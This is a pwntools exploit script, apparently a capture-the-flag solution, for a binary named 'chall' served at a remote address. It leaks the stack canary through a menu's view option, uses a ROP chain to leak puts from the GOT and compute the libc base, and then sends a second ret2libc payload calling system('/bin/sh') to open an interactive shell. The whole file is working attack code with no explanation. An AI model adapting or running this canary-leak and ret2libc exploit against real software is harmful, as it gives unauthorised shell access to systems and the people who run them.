#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc6.so'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '103.127.99.15', 9000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x401325
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
main = 0x040190e
pop_rdi = 0x04012b1
ret = 0x040101a

def decrypt(data, key):
    ret = []

    for i in range(1, len(key)):
        tmp = hex(data[i] ^ key[i])
        ret.append( str(tmp)[2:] )
    
    ret.append( hex(data[-1])[2:] )
    ret = ret[::-1]
    ret.append('00')
    ret = int(''.join(ret), 16)

    return ret

def exploit():
    global io
    io = initialize()
    
    # create
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b':', b'8')
    io.sendafter(b':', b'ABCDEFG')

    # view
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b':', b'n')

    leak = io.recvline()[1:-10]
    canary = decrypt(leak, b'ABCDEFG')

    offset = 14
    payload = flat({
        offset: [
            canary,
            0,
            pop_rdi,
            elf.got['puts'],
            elf.plt['puts'],
            main
        ]
    })
    io.sendlineafter(b':', payload)
    
    leak = io.recvline()[1:]
    puts = u64(leak.strip().ljust(8, b'\x00'))

    # libc6_2.35-0ubuntu3.5_amd64 
    libcaddress = puts - 0x080e50
    binsh = libcaddress + 0x1d8678
    system = libcaddress + 0x050d70

    payload = flat({
        offset: [
            canary,
            0,
            pop_rdi,
            binsh,
            ret,
            system
        ]
    })
    io.sendlineafter(b':', payload)

    info("canary: %#x", canary)
    info('puts: %#x', puts)
    info('libc base: %#x', libcaddress)
    io.interactive()
    
if __name__ == '__main__':
    exploit()